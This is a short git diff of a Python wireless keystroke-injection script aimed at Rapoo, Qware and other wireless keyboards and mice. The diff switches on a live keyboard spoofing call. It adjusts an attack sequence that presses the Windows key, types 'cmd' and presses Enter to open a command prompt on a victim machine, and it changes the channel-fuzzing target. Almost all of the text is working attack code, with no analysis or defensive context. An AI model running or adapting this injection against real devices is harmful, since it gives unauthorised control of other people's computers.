@@ -53,7 +53,7 @@ common.parse_and_init()
 """
 
 #Device.quick_sniff("3d:99:52:9c:11", [2, 6, 14, 18, 22, 30, 34, 38, 42, 46, 50, 54, 62, 66, 68, 70, 78, 80, 82, 10, 26, 72, 74], common.RF_RATE_2M, 30)
-#Device.fuzz_channels("3d:99:52:9c", common.RF_RATE_2M)
+#Device.fuzz_channels("55:79:90:16", common.RF_RATE_1M)
 
 
 """
@@ -103,7 +103,7 @@ attack_tx_keyboard = [
 attack_tx_mouse = tx_mouse.build_packet([MouseClickType.LEFT_CLICK], x_move="8888")
 
 #tx_mouse.sniff()
-#tx_keyboard.spoof(attack_tx_keyboard)
+tx_keyboard.spoof(attack_tx_keyboard)
 #tx_mouse.spoof(attack_tx_mouse)
 
 
@@ -116,7 +116,7 @@ rapoo_mouse = Rapoo_Mouse("c7:92:78:79:dc", 0x11021, 0xefdf)
 
 attack_rapoo_keyboard = [
     rapoo_keyboard.build_packet([KeyboardScancode.KEY_LGUI]),
-    lambda: time.sleep(1),
+    lambda: time.sleep(4),
     rapoo_keyboard.build_packet([KeyboardScancode.KEY_C, KeyboardScancode.KEY_M, KeyboardScancode.KEY_D]),
     lambda: time.sleep(1),
     rapoo_keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER]),
@@ -185,7 +185,7 @@ attack_qware_keyboard = [
 
 attack_qware_mouse = [qware_mouse.build_packet([MouseClickType.LEFT_CLICK], x_move="fe0100ff01", scrolling_move="FF")]
 
-qware_keyboard.sniff()
+#qware_keyboard.sniff()
 #qware_mouse.sniff()
 #qware_keyboard.spoof(attack_qware_keyboard)
 #qware_mouse.spoof(attack_qware_mouse)
